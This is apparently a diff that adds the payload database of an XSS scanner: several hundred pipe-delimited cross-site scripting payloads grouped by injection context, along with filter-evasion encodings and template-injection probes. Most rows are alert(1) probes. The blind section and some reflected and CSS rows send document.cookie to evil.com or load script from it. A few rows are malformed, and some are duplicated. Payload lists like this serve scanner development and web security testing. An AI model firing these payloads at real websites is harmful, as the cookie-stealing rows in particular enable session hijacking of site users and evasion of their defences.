@@ -1,0 +1,379 @@
+# XSS Scanner Pro - Payload Database
+# Format: TYPE|SEVERITY|CONFIDENCE|WAF_BYPASS|ENCODING|PAYLOAD
+# 
+# Types: REFLECTED, STORED, DOM, BLIND, WAF-BYPASS, POLYGLOT, EVENT, TEMPLATE, ATTR, JS-CONTEXT, CSS-CONTEXT, URL-CONTEXT
+# Severity: CRITICAL, HIGH, MEDIUM, LOW, INFO
+# Confidence: 100, 95, 90, 85, 80, 75, 70
+# WAF Bypass: YES, NO
+# Encoding: NONE, HTML-ENTITY, URL, BASE64, UNICODE, HEX, OCTAL
+
+# ============================================
+# REFLECTED XSS PAYLOADS
+# ============================================
+REFLECTED|CRITICAL|100|NO|NONE|<script>alert('XSS')</script>
+REFLECTED|CRITICAL|100|NO|NONE|<script>alert(1)</script>
+REFLECTED|CRITICAL|95|NO|NONE|<script>confirm('XSS')</script>
+REFLECTED|CRITICAL|95|NO|NONE|<script>prompt('XSS')</script>
+REFLECTED|HIGH|90|NO|NONE|<script>eval(atob('YWxlcnQoMSk='))</script>
+REFLECTED|HIGH|85|NO|NONE|<script>fetch('https://evil.com/?c='+document.cookie)</script>
+REFLECTED|CRITICAL|100|NO|NONE|<img src=x onerror=alert('XSS')>
+REFLECTED|CRITICAL|100|NO|NONE|<img src=x onerror=alert(1)>
+REFLECTED|HIGH|95|NO|NONE|<img src=x onerror=confirm(1)>
+REFLECTED|HIGH|90|NO|NONE|<img src=x onerror=prompt(1)>
+REFLECTED|CRITICAL|100|NO|NONE|<svg onload=alert('XSS')>
+REFLECTED|CRITICAL|100|NO|NONE|<svg onload=alert(1)>
+REFLECTED|HIGH|95|NO|NONE|<svg/onload=alert(1)>
+REFLECTED|HIGH|90|NO|NONE|<svg onload=eval(atob('YWxlcnQoMSk='))>
+REFLECTED|CRITICAL|100|NO|NONE|<body onload=alert('XSS')>
+REFLECTED|HIGH|95|NO|NONE|<body onpageshow=alert(1)>
+REFLECTED|HIGH|90|NO|NONE|<body onfocus=alert(1) autofocus>
+REFLECTED|CRITICAL|100|NO|NONE|<iframe src=javascript:alert('XSS')>
+REFLECTED|HIGH|95|NO|NONE|<iframe src="data:text/html,<script>alert(1)</script>">
+REFLECTED|HIGH|90|NO|NONE|<iframe srcdoc="<script>alert(1)</script>">
+REFLECTED|HIGH|95|NO|NONE|<input onfocus=alert(1) autofocus>
+REFLECTED|HIGH|90|NO|NONE|<input onblur=alert(1) autofocus>
+REFLECTED|MEDIUM|85|NO|NONE|<input type="text" onmouseover=alert(1)>
+REFLECTED|HIGH|90|NO|NONE|<textarea onfocus=alert(1) autofocus>
+REFLECTED|HIGH|85|NO|NONE|<select onfocus=alert(1) autofocus>
+REFLECTED|MEDIUM|80|NO|NONE|<video><source onerror=alert(1)>
+REFLECTED|MEDIUM|80|NO|NONE|<video onerror=alert(1) src=x>
+REFLECTED|MEDIUM|80|NO|NONE|<audio src=x onerror=alert(1)>
+REFLECTED|MEDIUM|75|NO|NONE|<audio onerror=alert(1) src=x>
+REFLECTED|MEDIUM|70|NO|NONE|<marquee onstart=alert(1)>
+REFLECTED|MEDIUM|70|NO|NONE|<marquee onbounce=alert(1)>
+REFLECTED|MEDIUM|75|NO|NONE|<object data="javascript:alert(1)">
+REFLECTED|MEDIUM|75|NO|NONE|<embed src="javascript:alert(1)">
+REFLECTED|MEDIUM|70|NO|NONE|<applet code="javascript:alert(1)">
+
+# ============================================
+# STORED XSS PAYLOADS
+# ============================================
+STORED|CRITICAL|100|NO|NONE|"><script>alert('XSS')</script>
+STORED|CRITICAL|100|NO|NONE|"><img src=x onerror=alert(1)>
+STORED|CRITICAL|95|NO|NONE|"><svg onload=alert(1)>
+STORED|HIGH|90|NO|NONE|'-alert(1)-'
+STORED|HIGH|90|NO|NONE|'-alert(1)-'
+STORED|HIGH|95|NO|NONE|</script><script>alert(1)</script>
+STORED|HIGH|90|NO|NONE|</textarea><script>alert(1)</script>
+STORED|HIGH|90|NO|NONE|</title><script>alert(1)</script>
+STORED|HIGH|85|NO|NONE|</style><script>alert(1)</script>
+STORED|HIGH|85|NO|NONE|</noscript><script>alert(1)</script>
+STORED|HIGH|90|NO|NONE|javascript:alert(1)
+STORED|MEDIUM|80|NO|NONE|data:text/html,<script>alert(1)</script>
+STORED|HIGH|85|NO|NONE|%3Cscript%3Ealert(1)%3C/script%3E
+STORED|HIGH|80|NO|NONE|&lt;script&gt;alert(1)&lt;/script&gt;
+
+# ============================================
+# DOM-BASED XSS PAYLOADS
+# ============================================
+DOM|CRITICAL|100|NO|NONE|#<img src=x onerror=alert(1)>
+DOM|CRITICAL|95|NO|NONE|#<script>alert(1)</script>
+DOM|HIGH|90|NO|NONE|javascript:alert(1)
+DOM|HIGH|90|NO|NONE|javascript:alert('XSS')
+DOM|HIGH|85|NO|NONE|data:text/html,<script>alert(1)</script>
+DOM|HIGH|85|NO|NONE|data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+DOM|MEDIUM|80|NO|NONE|vbscript:alert(1)
+DOM|MEDIUM|75|NO|NONE|livescript:alert(1)
+DOM|MEDIUM|75|NO|NONE|mocha:alert(1)
+DOM|HIGH|85|NO|NONE|%23%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+DOM|HIGH|80|NO|NONE|#<svg onload=alert(1)>
+DOM|HIGH|80|NO|NONE|#<body onload=alert(1)>
+
+# ============================================
+# BLIND XSS PAYLOADS
+# ============================================
+BLIND|CRITICAL|100|NO|NO|<script src=//evil.com/xss.js></script>
+BLIND|CRITICAL|95|NO|NO|<script src="https://evil.com/xss.js"></script>
+BLIND|HIGH|90|NO|NO|<img src=//evil.com/log?cookie= document.cookie>
+BLIND|HIGH|90|NO|NO|<img src="https://evil.com/log?c="+document.cookie>
+BLIND|HIGH|85|NO|NO|<script>fetch('https://evil.com/?c='+document.cookie)</script>
+BLIND|HIGH|85|NO|NO|<script>new Image().src='https://evil.com/?c='+document.cookie</script>
+BLIND|HIGH|80|NO|NO|<svg onload="fetch('https://evil.com/?c='+document.cookie)">
+BLIND|MEDIUM|75|NO|NO|<script>navigator.sendBeacon('https://evil.com/',document.cookie)</script>
+BLIND|MEDIUM|75|NO|NO|<script>location='https://evil.com/?c='+document.cookie</script>
+
+# ============================================
+# WAF BYPASS PAYLOADS
+# ============================================
+WAF-BYPASS|CRITICAL|95|YES|NONE|<scr ipt>alert(1)</scr ipt>
+WAF-BYPASS|CRITICAL|95|YES|NONE|<script >alert(1)</script >
+WAF-BYPASS|HIGH|90|YES|NONE|<script/**/>alert(1)</script>
+WAF-BYPASS|HIGH|90|YES|NONE|<script%0a>alert(1)</script>
+WAF-BYPASS|HIGH|85|YES|NONE|<script%0d>alert(1)</script>
+WAF-BYPASS|HIGH|85|YES|NONE|<script%09>alert(1)</script>
+WAF-BYPASS|HIGH|90|YES|NONE|<scr%00ipt>alert(1)</scr%00ipt>
+WAF-BYPASS|HIGH|85|YES|NONE|<scri%00pt>alert(1)</scri%00pt>
+WAF-BYPASS|CRITICAL|95|YES|NONE|<svg/onload=alert(1)>
+WAF-BYPASS|CRITICAL|90|YES|NONE|<svg onload=alert(1)>
+WAF-BYPASS|HIGH|85|YES|NONE|<svg%0aonload=alert(1)>
+WAF-BYPASS|HIGH|85|YES|NONE|<svg%09onload=alert(1)>
+WAF-BYPASS|CRITICAL|95|YES|NONE|<img src=x onerror=alert(1)>
+WAF-BYPASS|HIGH|90|YES|NONE|<img src=x onerror%00=alert(1)>
+WAF-BYPASS|HIGH|85|YES|NONE|<img%00src=x%00onerror=alert(1)>
+WAF-BYPASS|HIGH|90|YES|NONE|<body onload=alert(1)>
+WAF-BYPASS|HIGH|85|YES|NONE|<body%0aonload=alert(1)>
+WAF-BYPASS|HIGH|85|YES|NONE|<body onpageshow=alert(1)>
+WAF-BYPASS|HIGH|90|YES|HTML-ENTITY|<img src=x onerror=alert&#40;1&#41;>
+WAF-BYPASS|HIGH|90|YES|HTML-ENTITY|<img src=x onerror=alert&#x28;1&#x29;>
+WAF-BYPASS|HIGH|85|YES|HTML-ENTITY|<script>alert&#40;1&#41;</script>
+WAF-BYPASS|HIGH|85|YES|HTML-ENTITY|<svg onload=alert&#40;1&#41;>
+WAF-BYPASS|HIGH|90|YES|URL|%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+WAF-BYPASS|HIGH|90|YES|URL|%3Cscript%3Ealert(1)%3C/script%3E
+WAF-BYPASS|HIGH|85|YES|URL|%3Csvg%20onload%3Dalert(1)%3E
+WAF-BYPASS|HIGH|85|YES|UNICODE|<img src=x onerror=\u0061lert(1)>
+WAF-BYPASS|MEDIUM|80|YES|UNICODE|<script>\u0061lert(1)</script>
+WAF-BYPASS|HIGH|85|YES|HEX|<img src=x onerror=\x61lert(1)>
+WAF-BYPASS|MEDIUM|80|YES|OCTAL|<img src=x onerror=\141lert(1)>
+WAF-BYPASS|HIGH|90|YES|NONE|'><script>alert(1)</script>
+WAF-BYPASS|HIGH|90|YES|NONE\"><script>alert(1)</script>
+WAF-BYPASS|HIGH|85|YES|NONE|'><svg onload=alert(1)>
+WAF-BYPASS|HIGH|85|YES|NONE\"><img src=x onerror=alert(1)>
+
+# ============================================
+# POLYGLOT PAYLOADS (Multiple Contexts)
+# ============================================
+POLYGLOT|CRITICAL|95|YES|NONE|'\"><svg/onload=alert(1)>
+POLYGLOT|CRITICAL|95|YES|NONE|javascript://%0aalert(1)
+POLYGLOT|HIGH|90|YES|NONE|javascript://%0dalert(1)
+POLYGLOT|HIGH|90|YES|NONE|javascript://%09alert(1)
+POLYGLOT|HIGH|85|YES|NONE|//evil.com/?\"><script>alert(1)</script>
+POLYGLOT|HIGH|85|YES|NONE|\"><img src=x onerror=alert(1)>
+POLYGLOT|HIGH|85|YES|NONE|' onmouseover=alert(1) '
+POLYGLOT|MEDIUM|80|YES|NONE|" onfocus=alert(1) autofocus x="
+POLYGLOT|MEDIUM|80|YES|NONE|' onblur=alert(1) autofocus x='
+
+# ============================================
+# EVENT HANDLER PAYLOADS
+# ============================================
+EVENT|HIGH|90|NO|NONE|<div onmouseover=alert(1)>hover me</div>
+EVENT|HIGH|90|NO|NONE|<button onclick=alert(1)>click me</button>
+EVENT|HIGH|85|NO|NONE|<input onfocus=alert(1) autofocus>
+EVENT|HIGH|85|NO|NONE|<input onblur=alert(1) autofocus>
+EVENT|MEDIUM|80|NO|NONE|<input onchange=alert(1)>
+EVENT|MEDIUM|80|NO|NONE|<input onkeydown=alert(1)>
+EVENT|MEDIUM|80|NO|NONE|<input onkeypress=alert(1)>
+EVENT|MEDIUM|80|NO|NONE|<input onkeyup=alert(1)>
+EVENT|MEDIUM|75|NO|NONE|<div onmouseenter=alert(1)>hover me</div>
+EVENT|MEDIUM|75|NO|NONE|<div onmouseleave=alert(1)>hover me</div>
+EVENT|MEDIUM|75|NO|NONE|<div onmousedown=alert(1)>click me</div>
+EVENT|MEDIUM|75|NO|NONE|<div onmouseup=alert(1)>click me</div>
+EVENT|MEDIUM|70|NO|NONE|<div onmousemove=alert(1)>move mouse</div>
+EVENT|MEDIUM|70|NO|NONE|<div ondblclick=alert(1)>double click</div>
+EVENT|MEDIUM|70|NO|NONE|<div oncontextmenu=alert(1)>right click</div>
+EVENT|MEDIUM|75|NO|NONE|<form onsubmit=alert(1)><button>submit</button></form>
+EVENT|MEDIUM|75|NO|NONE|<select onchange=alert(1)><option>change</option></select>
+
+# ============================================
+# TEMPLATE INJECTION PAYLOADS
+# ============================================
+TEMPLATE|CRITICAL|95|NO|NONE|{{constructor.constructor('alert(1)')()}}
+TEMPLATE|CRITICAL|95|NO|NONE|{{_().constructor.constructor('alert(1)')()}}
+TEMPLATE|HIGH|90|NO|NONE|${alert(1)}
+TEMPLATE|HIGH|90|NO|NONE|<%= alert(1) %>
+TEMPLATE|HIGH|85|NO|NONE|#{alert(1)}
+TEMPLATE|HIGH|85|NO|NONE|{{7*7}}
+TEMPLATE|HIGH|80|NO|NONE|{{7*'7'}}
+TEMPLATE|MEDIUM|75|NO|NONE|{{''.class.mro[2].__subclasses__()}}
+TEMPLATE|MEDIUM|75|NO|NONE|{{config.items()}}
+
+# ============================================
+# ATTRIBUTE CONTEXT PAYLOADS
+# ============================================
+ATTR|HIGH|90|NO|NONE|" onmouseover=alert(1) x="
+ATTR|HIGH|90|NO|NONE|' onmouseover=alert(1) x='
+ATTR|HIGH|85|NO|NONE|" onfocus=alert(1) autofocus x="
+ATTR|HIGH|85|NO|NONE|' onfocus=alert(1) autofocus x='
+ATTR|MEDIUM|80|NO|NONE|javascript:alert(1)
+ATTR|MEDIUM|80|NO|NONE|data:text/html,<script>alert(1)</script>
+ATTR|MEDIUM|75|NO|NONE|%22%20onmouseover%3Dalert(1)%20x%3D%22
+
+# ============================================
+# JAVASCRIPT CONTEXT PAYLOADS
+# ============================================
+JS-CONTEXT|CRITICAL|100|NO|NONE|';alert(1);'
+JS-CONTEXT|CRITICAL|100|NO|NONE|';alert(1);//
+JS-CONTEXT|HIGH|95|NO|NONE|';alert(1);var a='
+JS-CONTEXT|HIGH|95|NO|NONE|-alert(1)-
+JS-CONTEXT|HIGH|90|NO|NONE|\'-alert(1)-\'
+JS-CONTEXT|HIGH|90|NO|NONE|"-alert(1)-"
+JS-CONTEXT|HIGH|85|NO|NONE|';alert(String.fromCharCode(88,83,83));'
+JS-CONTEXT|MEDIUM|80|NO|NONE|';eval(atob('YWxlcnQoMSk='));'
+JS-CONTEXT|MEDIUM|80|NO|NONE|setTimeout('alert(1)',0)
+JS-CONTEXT|MEDIUM|75|NO|NONE|setInterval('alert(1)',0)
+
+# ============================================
+# CSS CONTEXT PAYLOADS
+# ============================================
+CSS-CONTEXT|MEDIUM|75|NO|NONE|</style><script>alert(1)</script>
+CSS-CONTEXT|MEDIUM|75|NO|NONE|</style><img src=x onerror=alert(1)>
+CSS-CONTEXT|MEDIUM|70|NO|NONE|</style><svg onload=alert(1)>
+CSS-CONTEXT|MEDIUM|70|NO|NONE|expression(alert(1))
+CSS-CONTEXT|MEDIUM|65|NO|NONE|-moz-binding(url('http://evil.com/xss.xml'))
+
+# ============================================
+# URL CONTEXT PAYLOADS
+# ============================================
+URL-CONTEXT|HIGH|90|NO|NONE|javascript:alert(1)
+URL-CONTEXT|HIGH|90|NO|NONE|javascript:alert('XSS')
+URL-CONTEXT|HIGH|85|NO|NONE|data:text/html,<script>alert(1)</script>
+URL-CONTEXT|HIGH|85|NO|NONE|data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+URL-CONTEXT|MEDIUM|80|NO|NONE|vbscript:alert(1)
+URL-CONTEXT|MEDIUM|75|NO|NONE|%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29
+
+# ============================================
+# ADVANCED WAF BYPASS TECHNIQUES
+# ============================================
+WAF-BYPASS|CRITICAL|95|YES|NONE|<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+WAF-BYPASS|HIGH|90|YES|NONE|<script>eval(atob('YWxlcnQoMSk='))</script>
+WAF-BYPASS|HIGH|90|YES|NONE|<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+WAF-BYPASS|HIGH|85|YES|NONE|<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+WAF-BYPASS|HIGH|90|YES|NONE|<script>top['al'+'ert'](1)</script>
+WAF-BYPASS|HIGH|85|YES|NONE|<script>window['al'+'ert'](1)</script>
+WAF-BYPASS|HIGH|85|YES|NONE|<script>self['al'+'ert'](1)</script>
+WAF-BYPASS|HIGH|80|YES|NONE|<script>parent['al'+'ert'](1)</script>
+WAF-BYPASS|HIGH|85|YES|NONE|<img src=x onerror=top['al'+'ert'](1)>
+WAF-BYPASS|MEDIUM|80|YES|NONE|<svg onload=top['al'+'ert'](1)>
+WAF-BYPASS|HIGH|85|YES|NONE|<script>alert``</script>
+WAF-BYPASS|HIGH|85|YES|NONE|<script>alert[]</script>
+WAF-BYPASS|HIGH|80|YES|NONE|<script>alert(0)</script>
+WAF-BYPASS|MEDIUM|75|YES|NONE|<script>alert(!1)</script>
+WAF-BYPASS|MEDIUM|75|YES|NONE|<script>alert(+1)</script>
+WAF-BYPASS|HIGH|85|YES|NONE|<script>alert(/1/.source)</script>
+WAF-BYPASS|MEDIUM|80|YES|NONE|<script>alert(String(1))</script>
+WAF-BYPASS|MEDIUM|80|YES|NONE|<script>alert(String.fromCharCode(49))</script>
+WAF-BYPASS|HIGH|90|YES|NONE|<script>prompt``</script>
+WAF-BYPASS|HIGH|85|YES|NONE|<script>confirm``</script>
+WAF-BYPASS|HIGH|85|YES|NONE|<script>alert(document.domain)</script>
+WAF-BYPASS|HIGH|80|YES|NONE|<script>alert(document.cookie)</script>
+WAF-BYPASS|MEDIUM|75|YES|NONE|<script>alert(window.location)</script>
+WAF-BYPASS|MEDIUM|75|YES|NONE|<script>alert(navigator.userAgent)</script>
+
+# ============================================
+# CASE VARIATION BYPASS
+# ============================================
+WAF-BYPASS|HIGH|90|YES|NONE|<ScRiPt>alert(1)</ScRiPt>
+WAF-BYPASS|HIGH|90|YES|NONE|<sCrIpT>alert(1)</ScRiPt>
+WAF-BYPASS|HIGH|85|YES|NONE|<SCRIPT>alert(1)</SCRIPT>
+WAF-BYPASS|HIGH|85|YES|NONE|<IMG SRC=X ONERROR=ALERT(1)>
+WAF-BYPASS|HIGH|85|YES|NONE|<Img Src=x OnError=alert(1)>
+WAF-BYPASS|HIGH|85|YES|NONE|<SVG ONLOAD=ALERT(1)>
+WAF-BYPASS|MEDIUM|80|YES|NONE|<Svg OnLoad=alert(1)>
+
+# ============================================
+# NULL BYTE BYPASS
+# ============================================
+WAF-BYPASS|HIGH|90|YES|NONE|<scr%00ipt>alert(1)</scr%00ipt>
+WAF-BYPASS|HIGH|85|YES|NONE|<img%00src=x onerror=alert(1)>
+WAF-BYPASS|HIGH|85|YES|NONE|<svg%00onload=alert(1)>
+WAF-BYPASS|MEDIUM|80|YES|NONE|<script>al%00ert(1)</script>
+
+# ============================================
+# COMMENT BYPASS
+# ============================================
+WAF-BYPASS|HIGH|90|YES|NONE|<script>alert(1)<!--</script>
+WAF-BYPASS|HIGH|85|YES|NONE|<script><!--alert(1)//--></script>
+WAF-BYPASS|HIGH|85|YES|NONE|<script>/*alert(1)*/</script>
+WAF-BYPASS|MEDIUM|80|YES|NONE|<img src=x onerror=alert(1)//>
+
+# ============================================
+# DOUBLE ENCODING BYPASS
+# ============================================
+WAF-BYPASS|HIGH|85|YES|URL|%253Cscript%253Ealert(1)%253C%252Fscript%253E
+WAF-BYPASS|HIGH|80|YES|URL|%2522%2520onmouseover%253Dalert(1)%2520x%253D%2522
+
+# ============================================
+# PAYLOAD OBFUSCATION
+# ============================================
+WAF-BYPASS|HIGH|90|YES|NONE|<script>eval('al'+'ert(1)')</script>
+WAF-BYPASS|HIGH|85|YES|NONE|<script>eval('ale'+'rt(1)')</script>
+WAF-BYPASS|HIGH|85|YES|NONE|<script>eval('aler'+'t(1)')</script>
+WAF-BYPASS|MEDIUM|80|YES|NONE|<script>eval('a'+'l'+'e'+'r'+'t'+'(1)')</script>
+WAF-BYPASS|HIGH|85|YES|NONE|<script>Function('alert(1)')()</script>
+WAF-BYPASS|MEDIUM|80|YES|NONE|<script>new Function('alert(1)')()</script>
+WAF-BYPASS|MEDIUM|80|YES|NONE|<script>setTimeout('alert(1)')</script>
+WAF-BYPASS|MEDIUM|75|YES|NONE|<script>setInterval('alert(1)')</script>
+
+# ============================================
+# HTML5 SPECIFIC PAYLOADS
+# ============================================
+REFLECTED|MEDIUM|75|NO|NONE|<details ontoggle=alert(1) open>
+REFLECTED|MEDIUM|75|NO|NONE|<details ontoggle=alert(1)>
+REFLECTED|MEDIUM|70|NO|NONE|<summary ontoggle=alert(1)>
+REFLECTED|MEDIUM|75|NO|NONE|<meter onmouseover=alert(1)>
+REFLECTED|MEDIUM|70|NO|NONE|<progress onmouseover=alert(1)>
+REFLECTED|MEDIUM|75|NO|NONE|<canvas onmouseover=alert(1)>
+REFLECTED|MEDIUM|70|NO|NONE|<menu onshow=alert(1)>
+REFLECTED|MEDIUM|70|NO|NONE|<dialog onclose=alert(1) open>
+
+# ============================================
+# SVG SPECIFIC PAYLOADS
+# ============================================
+REFLECTED|HIGH|90|NO|NONE|<svg><script>alert(1)</script></svg>
+REFLECTED|HIGH|85|NO|NONE|<svg><a onmouseover=alert(1)><rect /></a></svg>
+REFLECTED|HIGH|85|NO|NONE|<svg onload=alert(1) xmlns="http://www.w3.org/2000/svg">
+REFLECTED|MEDIUM|80|NO|NONE|<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+REFLECTED|MEDIUM|80|NO|NONE|<svg><animateTransform onbegin=alert(1) attributeName=transform>
+REFLECTED|MEDIUM|75|NO|NONE|<svg><set onbegin=alert(1) attributeName=x>
+
+# ============================================
+# MATHML PAYLOADS
+# ============================================
+REFLECTED|MEDIUM|75|NO|NONE|<math><mtext onmouseover=alert(1)>X</mtext></math>
+REFLECTED|MEDIUM|70|NO|NONE|<math href="javascript:alert(1)">X</math>
+
+# ============================================
+# META/REDIRECT PAYLOADS
+# ============================================
+REFLECTED|MEDIUM|75|NO|NONE|<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+REFLECTED|MEDIUM|70|NO|NONE|<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
+
+# ============================================
+# LINK/STYLESHEET PAYLOADS
+# ============================================
+REFLECTED|MEDIUM|75|NO|NONE|<link rel="stylesheet" href="javascript:alert(1)">
+REFLECTED|MEDIUM|70|NO|NONE|<link rel="import" href="data:text/html,<script>alert(1)</script>">
+
+# ============================================
+# TABLE PAYLOADS
+# ============================================
+REFLECTED|MEDIUM|70|NO|NONE|<table background="javascript:alert(1)">
+REFLECTED|MEDIUM|70|NO|NONE|<td background="javascript:alert(1)">
+REFLECTED|MEDIUM|70|NO|NONE|<th background="javascript:alert(1)">
+
+# ============================================
+# FRAME/FRAMESET PAYLOADS
+# ============================================
+REFLECTED|MEDIUM|75|NO|NONE|<frame src="javascript:alert(1)">
+REFLECTED|MEDIUM|75|NO|NONE|<frameset onload=alert(1)>
+
+# ============================================
+# ISINDEX PAYLOADS
+# ============================================
+REFLECTED|MEDIUM|70|NO|NONE|<isindex action="javascript:alert(1)" type=image>
+REFLECTED|MEDIUM|70|NO|NONE|<isindex formaction="javascript:alert(1)" type=image>
+
+# ============================================
+# BUTTON/INPUT FORMACTION
+# ============================================
+REFLECTED|MEDIUM|75|NO|NONE|<button formaction="javascript:alert(1)">X</button>
+REFLECTED|MEDIUM|75|NO|NONE|<input type="image" formaction="javascript:alert(1)">
+
+# ============================================
+# BASE HREF PAYLOADS
+# ============================================
+REFLECTED|MEDIUM|70|NO|NONE|<base href="javascript:alert(1)//">
+
+# ============================================
+# XLINK PAYLOADS
+# ============================================
+REFLECTED|MEDIUM|75|NO|NONE|<svg><use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>"></use></svg>
+
+# ============================================
+# FOREIGNOBJECT PAYLOADS
+# ============================================
+REFLECTED|MEDIUM|75|NO|NONE|<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>
+
+# ============================================
+# FEIMAGE PAYLOADS
+# ============================================
+REFLECTED|MEDIUM|70|NO|NONE|<svg><feImage xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>"></feImage></svg>
